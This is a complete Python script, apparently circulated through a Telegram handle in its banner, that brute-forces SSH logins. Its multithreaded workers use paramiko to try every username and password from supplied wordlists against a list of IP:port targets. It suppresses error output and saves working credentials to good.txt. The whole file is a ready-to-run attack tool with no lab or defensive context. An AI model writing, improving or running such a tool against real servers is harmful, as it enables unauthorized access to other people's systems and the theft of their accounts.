import os
import sys
import time
from threading import Lock, Thread
from queue import Queue
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from pystyle import Colors, Colorate, Center
from contextlib import suppress
from logging import CRITICAL, basicConfig


basicConfig(level=CRITICAL)
sys.stderr = open(os.devnull, 'w')
lock = Lock()

class Counter:
    def __init__(self, value=0):
        self.value = value
        self.lock = Lock()

    def increment(self):
        with self.lock:
            self.value += 1

    def get(self):
        with self.lock:
            return self.value

class Logger:
    @staticmethod
    def success(message):
        print(Colorate.Horizontal(Colors.green_to_white, f"[SUCCESS] {message}"))

    @staticmethod
    def error(message):
        print(Colorate.Horizontal(Colors.red_to_white, f"[ERROR] {message}"))

    @staticmethod
    def warning(message):
        print(Colorate.Horizontal(Colors.yellow_to_white, f"[WARNING] {message}"))

    @staticmethod
    def info(message):
        print(Colorate.Horizontal(Colors.blue_to_white, f"[INFO] {message}"))

class SSHCracker:
    def __init__(self, ip_file, user_file, pass_file, threads, timeout=10):
        self.ip_file = ip_file
        self.user_file = user_file
        self.pass_file = pass_file
        self.timeout = timeout
        self.threads = threads
        self.queue = Queue()
        self.success_log = "good.txt"
        self.error_log = "error.txt"
        self.no_access_log = "no-access.txt"
        self.success_count = Counter(0)
        self.error_count = Counter(0)
        self.checked_count = Counter(0)

    def load_data(self, file_path):
        if not os.path.isfile(file_path):
            Logger.error(f"File '{file_path}' not found.")
            sys.exit(1)
        
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]

    def write_log(self, filename, message):
        with lock:
            with open(filename, "a") as f:
                f.write(message + "\n")

    def ssh_connect(self, ip, port, username, password):
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, timeout=self.timeout)
            success_msg = f"{ip}:{port} - User: {username}, Password: {password}"
            Logger.success(success_msg)
            self.write_log(self.success_log, success_msg)
            self.success_count.increment()
        except AuthenticationException:
            error_msg = f"{ip}:{port} - Invalid credentials (User: {username}, Password: {password})"
            Logger.error(error_msg)
            self.write_log(self.error_log, error_msg)
            self.error_count.increment()
        except Exception as e:
            warning_msg = f"{ip}:{port} - {e}"
            Logger.warning(warning_msg)
            self.write_log(self.no_access_log, warning_msg)
            self.error_count.increment()
        finally:
            self.checked_count.increment()
            if 'client' in locals():
                client.close()

    def worker(self, user_list, pass_list):
        while not self.queue.empty():
            ip, port = self.queue.get()
            for username in user_list:
                for password in pass_list:
                    self.ssh_connect(ip, port, username, password)
            self.queue.task_done()

    def start(self):

        Logger.info("Start Cracking . .")
        time.sleep(0.1)

        for log_file in [self.success_log, self.error_log, self.no_access_log]:
            with open(log_file, "w"):
                pass

        ip_list = self.load_data(self.ip_file)
        user_list = self.load_data(self.user_file)
        pass_list = self.load_data(self.pass_file)

        for line in ip_list:
            if ":" in line:
                ip, port = line.split(":")
                self.queue.put((ip.strip(), int(port.strip())))
            else:
                Logger.warning(f"Invalid format in IP file: {line}")

        threads = []
        for _ in range(self.threads):
            thread = Thread(target=self.worker, args=(user_list, pass_list))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        Logger.info(f"SSH Cracking Complete!")
        print(f"\n{Colors.green}Summary:{Colors.reset} Success: {self.success_count.get()}, Errors: {self.error_count.get()}, Total Checked: {self.checked_count.get()}")

def clear_console():
    
    os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":

    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""
███████ ███████ ██   ██      ██████ ██████   █████   ██████ ██   ██ ███████ ██████  
██      ██      ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
███████ ███████ ███████     ██      ██████  ███████ ██      █████   █████   ██████  
     ██      ██ ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
███████ ███████ ██   ██      ██████ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██ 

                                t.me/secabuser       
    """)))

    with suppress(KeyboardInterrupt):
        ip_file = input(Colors.red + "IP file (e.g., ips.txt): " + Colors.reset).strip()
        user_file = input(Colors.red + "Username file (e.g., users.txt): " + Colors.reset).strip()
        pass_file = input(Colors.red + "Password file (e.g., passwords.txt): " + Colors.reset).strip()
        threads = int(input(Colors.red + "Number of threads: " + Colors.reset).strip())

        clear_console()
        print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""
███████ ███████ ██   ██      ██████ ██████   █████   ██████ ██   ██ ███████ ██████  
██      ██      ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
███████ ███████ ███████     ██      ██████  ███████ ██      █████   █████   ██████  
     ██      ██ ██   ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
███████ ███████ ██   ██      ██████ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██ 

                                t.me/secabuser                                                    
        """)))

        cracker = SSHCracker(ip_file, user_file, pass_file, threads)
        cracker.start()
